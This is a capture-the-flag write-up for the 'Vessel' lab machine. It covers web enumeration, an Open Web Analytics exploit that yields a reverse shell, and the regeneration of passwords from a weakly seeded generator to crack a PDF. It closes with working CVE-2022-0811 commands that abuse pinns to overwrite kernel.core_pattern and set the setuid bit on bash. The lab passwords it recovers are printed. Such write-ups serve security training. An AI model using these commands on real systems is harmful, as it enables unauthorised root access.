# Vessel!
## @Author : M3tr1c_r00t

![Vessel](https://user-images.githubusercontent.com/99975622/219419501-9f075be3-9948-4b60-818a-128f585ceb43.png)

### Enumeration...
#### Nmap
```
# Nmap 7.93 scan initiated Wed Feb  1 22:29:45 2023 as: nmap -sC -sV -A -p 22,80 -oN nmapports.txt 10.10.11.178
Nmap scan report for 10.10.11.178
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 38c297327b9ec565b44b4ea330a59aa5 (RSA)
|   256 33b355f4a17ff84e48dac5296313833d (ECDSA)
|_  256 a1f1881c3a397274e6301f28b680254e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Vessel
|_http-trane-info: Problem with XML parsing of /evox/about
|_http-server-header: Apache/2.4.41 (Ubuntu)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 4.15 - 5.6 (95%), Linux 5.3 - 5.4 (95%), Linux 2.6.32 (95%), Linux 5.0 - 5.3 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 5.0 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT       ADDRESS
1   238.94 ms 10.10.14.1
2   239.17 ms 10.10.11.178

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb  1 22:30:06 2023 -- 1 IP address (1 host up) scanned in 22.00 seconds

```

#### Dirsearch
This time, i used a different fuzzing tool :)
```
# Dirsearch started Wed Feb  1 22:30:24 2023 as: dirsearch.py -w /usr/share/wordlists/dirb/common.txt -u http://vessel.htb -e php,txt,html,css,js -o /home/kali/Desktop/Vessel/dsearch.txt

200     2KB  http://vessel.htb:80/401
200     2KB  http://vessel.htb:80/404
200     2KB  http://vessel.htb:80/500
302    28B   http://vessel.htb:80/admin    -> REDIRECTS TO: /login
302    28B   http://vessel.htb:80/ADMIN    -> REDIRECTS TO: /login
302    28B   http://vessel.htb:80/Admin    -> REDIRECTS TO: /login
302    26B   http://vessel.htb:80/charts    -> REDIRECTS TO: /401
301   173B   http://vessel.htb:80/css    -> REDIRECTS TO: /css/
301   173B   http://vessel.htb:80/dev    -> REDIRECTS TO: /dev/
301   173B   http://vessel.htb:80/img    -> REDIRECTS TO: /img/
301   171B   http://vessel.htb:80/js    -> REDIRECTS TO: /js/
200     4KB  http://vessel.htb:80/Login
200     4KB  http://vessel.htb:80/login
302    28B   http://vessel.htb:80/logout    -> REDIRECTS TO: /login
200     6KB  http://vessel.htb:80/register
403   275B   http://vessel.htb:80/server-status
```
### Foothold as www-data
Since there were only 2 ports open, we can go ahead and check out the running web-server.

![Screenshot_2023-02-01_22_35_05](https://user-images.githubusercontent.com/99975622/219421033-1525963c-68f4-494e-8cf0-a64932fc5e22.png)

If we scroll down the index page, we find there was a contact form. 
![Screenshot_2023-02-01_22_35_05](https://user-images.githubusercontent.com/99975622/219421033-1525963c-68f4-494e-8cf0-a64932fc5e22.png)
But if we try and capture the request being sent, nothing was happening. Guessing by the fact it lacked a reference point.
![image](https://user-images.githubusercontent.com/99975622/219422633-806bb376-56ce-4b5b-8bbf-7725d7e9a9c9.png)

With that, I checked  up on my directory bruteforce results and found a login page.
![Screenshot_2023-02-01_22_35_15](https://user-images.githubusercontent.com/99975622/219426886-cb02ebc7-cd5f-4c84-83e5-dec450a24d30.png)

There was also a /register and a /reset tab but they we're un responsive.
![Screenshot_2023-02-01_22_35_45](https://user-images.githubusercontent.com/99975622/219427272-fc43608b-e5a6-4fcf-8cfa-2a8647845aef.png)

![Screenshot_2023-02-01_22_37_10](https://user-images.githubusercontent.com/99975622/219427327-482a2c71-016b-4e92-b107-d5ffe7a66be6.png)

With that, we have only one valid page which we can work with; the login page.
We could try an sql injection but after manually trying some payloads and also using sqlmap, nothing happened.

Next up, i tried working with nosql injection but no luck, so i went back to researching and found that we could do an unseen sql injection by bypassing the escape functions.

Typically, An "unseen" SQL injection refers to a type of SQL injection attack that can bypass traditional security measures designed to detect and prevent SQL injection attacks. This type of attack can be difficult to detect because it is designed to evade common detection techniques such as input validation and escaping.

In an unseen SQL injection attack, an attacker may use various techniques to obfuscate their malicious SQL code, making it difficult for security measures to recognize the attack. For example, an attacker may use character encoding, comments, or other techniques to hide the attack code within seemingly innocent data.

To prevent unseen SQL injection attacks, it's important to use a combination of security measures such as input validation, parameterized queries, and security testing to detect and mitigate potential vulnerabilities.

```
https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4
```
After reading the above article, i found a way of executing this and it gave me access into the system.
![Screenshot_2023-02-01_23_01_53](https://user-images.githubusercontent.com/99975622/219496184-1405a8e7-82bf-48de-b185-2be60ba261ba.png)

And we are in.
![Screenshot_2023-02-01_23_01_57](https://user-images.githubusercontent.com/99975622/219496282-c0ec8a0b-f5bd-475f-91b5-ac1fdaf9d009.png)

We are then redirected to the admin panel.

![Screenshot_2023-02-01_23_02_10](https://user-images.githubusercontent.com/99975622/219496565-748fc1a3-3c3b-4fc2-a579-636552655cf1.png)

Since the site seemed to be static, i started looking around for links and i found a subdomain link.

![Screenshot_2023-02-01_23_04_54](https://user-images.githubusercontent.com/99975622/219496634-ea591bfa-af96-4e02-844b-3e0d5c4c4ec6.png)

```
openwebanalytics.vessel.htb
```
After adding the sub-domain into my /etc/hosts file, I visited it and we we're redirected to a login page.

![Screenshot_2023-02-01_23_06_52](https://user-images.githubusercontent.com/99975622/219497030-b7f6cc30-b316-491e-8517-620bae5bd9a8.png)

If we check the source code, we found a version number.

```
version=1.7.3
```
With this piece of information, I went on ahead to google and checked on whether there was any publicly available exploit.

There were two, unauthenticated which i found on a github repo and an authenticated one which was in searchsploit.


![Screenshot_2023-02-01_23_26_12](https://user-images.githubusercontent.com/99975622/219497629-ca345d3d-ba1e-49ae-abd1-9e6b34b8c9c9.png)

In our case we are going to use the unauthenticated exploit  since we did not have any credentials.
![Screenshot_2023-02-01_23_28_02](https://user-images.githubusercontent.com/99975622/219497822-fd0c570e-8c3f-4ff5-80de-882af00f8d6e.png)

After that, i downloaded the exploit onto my machine and tried to run it.

![Screenshot_2023-02-01_23_28_10](https://user-images.githubusercontent.com/99975622/219497944-ff363698-a645-4f49-a640-71c8a18fcbf5.png)

So basically the vulnerability exists in the OWA user interface, specifically in the "sites.php" file, which is used to manage websites within the OWA installation. An attacker can exploit this vulnerability by sending a specially crafted HTTP request to the OWA installation with a malicious script as a parameter. When a user with sufficient privileges views the website in question in the OWA user interface, the script is executed, potentially allowing the attacker to steal sensitive data or perform other malicious actions.
 
The script therefore sends a reverse shell php script via the affected module and with that, we get access into the system as www-data.
![Screenshot_2023-02-01_23_32_22](https://user-images.githubusercontent.com/99975622/219499432-605ccd5d-e620-455c-a5a3-4dea8f1d344e.png)

### www-data to user
#### More enumeration...
Once in the system, i found 2 files in steven's home directory in a hidden folder called notes.
I also a binary called password generator in steven's home directory.
They we're a picture and a pdf file which was locked.
![Screenshot_2023-02-01_23_45_17](https://user-images.githubusercontent.com/99975622/219500359-789ba1fc-c520-47e0-9581-d842e1f38575.png)

![screenshot](https://user-images.githubusercontent.com/99975622/219500955-2e2f18e9-abe6-445e-8492-334d255f24ba.png)

I also found a git repo which i downloaded onto my machine and found the database password.
![Screenshot_2023-02-01_23_54_14](https://user-images.githubusercontent.com/99975622/219500196-31198743-7bf9-47f7-bd4d-007b0a01f337.png)

Database password...
![Screenshot_2023-02-01_23_56_29](https://user-images.githubusercontent.com/99975622/219500303-5e622c95-77d9-4e38-89dd-759b55ef9d68.png)

I logged into the password to see if I could find anything valuable but only got a wierd password which at first I thought was encrypted but it turns out it wasnt.

![Screenshot_2023-02-02_00_00_41](https://user-images.githubusercontent.com/99975622/219500698-89560c0a-a9f5-42d0-be30-74f065985974.png)

I'm guessing by now you've already seen the trend. :)

#### Debugging
I ran the file command but the output was that the binary was a MS Dos one.
With that, i ran gdb and tried to view the libraries,functions and even disassemble but no luck. 

With that, I decided to run the binary and try and see how it works.
The program kinda hanged and when i canceled the process, i noticed an error at line 182 which hinted me that the binary was written in python.
![image](https://user-images.githubusercontent.com/99975622/219502383-609a9ce5-7bbd-4ea8-b0e2-6f4ff1440dfc.png)

#### Uncompiling
![image](https://user-images.githubusercontent.com/99975622/219505604-607913a3-a215-4b5b-953c-7662f65d71d2.png)

We can now decompile this python binary using this program;
```
// We are gonna decompile the binary using this tool...
https://github.com/extremecoders-re/pyinstxtractor

// You may need to set up the following for it to work well
sudo pip install PySide2

// Then we are gonna decompile the .pyc function using this...
uncompyle6
https://github.com/rocky/python-uncompyle6/
```

So now, we decompile the binary ;
![Screenshot_2023-02-12_16_56_48](https://user-images.githubusercontent.com/99975622/219503875-406606d4-7729-42c7-a38e-1200a547133e.png)

After its done, look for the passwordgenerator.pyc file so that we can also decompile it.
![Screenshot_2023-02-12_17_02_47](https://user-images.githubusercontent.com/99975622/219504360-339467dc-96f9-4e2a-bc06-ffd4a115a639.png)

After the decompiling process,we can now make our payload.
For this to work, we need to take the genpassword part of the code so that we can try and recreate the password made by the payload so that we can maybe try to crack the pdf file which might have something interesting.

```
import random
import string

def gen_password():
    return ''.join(random.choice(string.ascii_letters + string.digits + string.punctuation) for _ in range(32))

def gen_possible_passes():
    passwords = set()
    while len(passwords) < 1000000:
        passwords.add(gen_password())
    with open('pass.txt', 'w') as f:
        f.write('\n'.join(passwords))

gen_possible_passes()
```
Due to this type of password generation, the number of passwords that can be generated in total using this password generator is  approximately 3.02 x 10^61.

Instead i used this script provided by a friend:
```
from PySide2.QtCore import *


def genPassword():
    length = 32
    char = 0
    if char == 0:
        charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890~!@#$%^&*()_-+={}[]|:;<>,.?'
    else:
        if char == 1:
            charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
        else:
            if char == 2:
                charset = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz1234567890'
            else:
                pass
    try:
        qsrand(QTime.currentTime().msec())
        password = ''
        for i in range(length):
            idx = qrand() % len(charset)
            nchar = charset[idx]
            password += str(nchar)
    except:
        print('error')
    return password


def gen_possible_passes():
    passes = []
    try:
        while True:
            ps = genPassword()
            if ps not in passes:
                passes.append(ps)
                # print(ps)
                print(len(passes))
    except KeyboardInterrupt:
        with open('pass.txt', 'w') as ofile:
            for p in passes:
                ofile.write(p + '\n')


gen_possible_passes()
```
This code generates a list of random passwords with different characters sets, and writes the passwords to a text file named "pass.txt". The passwords are generated using PySide2.QtCore, a Python library for creating graphical user interfaces, but in this code it is only used for generating random numbers.

The code consists of two functions: genPassword() and gen_possible_passes().

The genPassword() function generates a single random password of length 32 characters, chosen from a set of characters based on the value of the char variable. If char is 0, the set includes alphanumeric characters and various special characters; if char is 1, the set includes only upper and lower case alphabetical characters; and if char is 2, the set includes alphanumeric characters only. The qsrand() and qrand() functions are used to generate random indices for selecting characters from the set, and the selected characters are concatenated to form the password.

The gen_possible_passes() function repeatedly calls genPassword() and adds the resulting password to a list of passwords, as long as the password is not already in the list. The function continues to generate passwords until it is interrupted by a keyboard interrupt (i.e., when the user presses Ctrl+C in the console). Once the function is interrupted, it writes the list of passwords to a text file named "pass.txt". The password list is not printed to the console, but the number of passwords generated is printed as they are added to the list.

```
pdfcrack -f notes.pdf -w possible_pass.txt
```

And after a super long time of waiting, we finally find the password;
```
YG7Q7RDzA+q&ke~MJ8!yRzoI^VQxSqSS
```
![Screenshot_2023-02-12_17_36_04](https://user-images.githubusercontent.com/99975622/219509805-0307afaa-6544-4f5f-8a18-2c60f485291a.png)
And we found the user password.
```
b@mPRNSVTjjLKId1T
```
![Screenshot_2023-02-12_17_36_43](https://user-images.githubusercontent.com/99975622/219509955-7bf452dd-c7a7-4254-9bc4-19a88d3190f6.png)

### User to root
Immediately after running linpeas, i found a wierd binary called __pinns__.

![Screenshot_2023-02-12_17_43_14](https://user-images.githubusercontent.com/99975622/219510589-e7dda924-4aa3-46d7-816b-cbbef4b17c38.png)

I looked for it in gtfobins but it wasnt there.
After doing a google search ;
```
https://www.crowdstrike.com/blog/cr8escape-new-vulnerability-discovered-in-cri-o-container-engine-cve-2022-0811/

https://sysdig.com/blog/cve-2022-0811-cri-o/
```
![image](https://user-images.githubusercontent.com/99975622/219511219-28647952-736f-43ca-88ec-36eef4a63351.png)

Proof of Concept:
Create a directory /tmp/foo and cd into the directory, there run these commands:
```
runc spec --rootless
mkdir rootfs
vi config.json
```
Hint: There are scripts that keep deleting stuff in various directories. (see pspy64 output)

2. In the "mounts" section of config.json append the following entry:
```
{
    "type": "bind",
    "source": "/",
    "destination": "/",
    "options": [
        "rbind",
        "rw",
        "rprivate"
    ]
},
```
3. In the previously created /tmp/foo/ directory, run:
```
runc --root /tmp/foo run alpine
```
We're now inside a read-only container.

4. In another SSH session, create a bar.sh script , which sets the setuid bit of /usr/bin/bash.
```
echo -e '#!/bin/sh\nchmod +s /usr/bin/bash' > /tmp/foo/bar.sh && chmod +x /tmp/foo/bar.sh
```
5. Now use pinns to assign the kernel.core_pattern a value, so once the core dump occurs, it executes our malicious script.
```
pinns -d /var/run -f 844aa3c8-2c60-4245-a7df-9e26768ff303 -s 'kernel.shm_rmid_forced=1+kernel.core_pattern=|/tmp/foo/bar.sh #' --ipc --net --uts --cgroup
```
6. Trigger a core dump in the read-only container.
```
# ulimit -c unlimited
# tail -f /dev/null &
# ps
# bash -i
# kill -SIGSEGV $num
# ps
```
Now just check if the bin/bash binary has the suid bit.
![Screenshot_2023-02-12_18_11_58](https://user-images.githubusercontent.com/99975622/219512299-e087db0b-119e-4b7c-9a1a-0a60ee6abfe5.png)

And done!
We're root!
## My socials:
<br>@ twitter: https://twitter.com/M3tr1c_r00t
<br>@ instagram: https://instagram.com/m3tr1c_r00t/
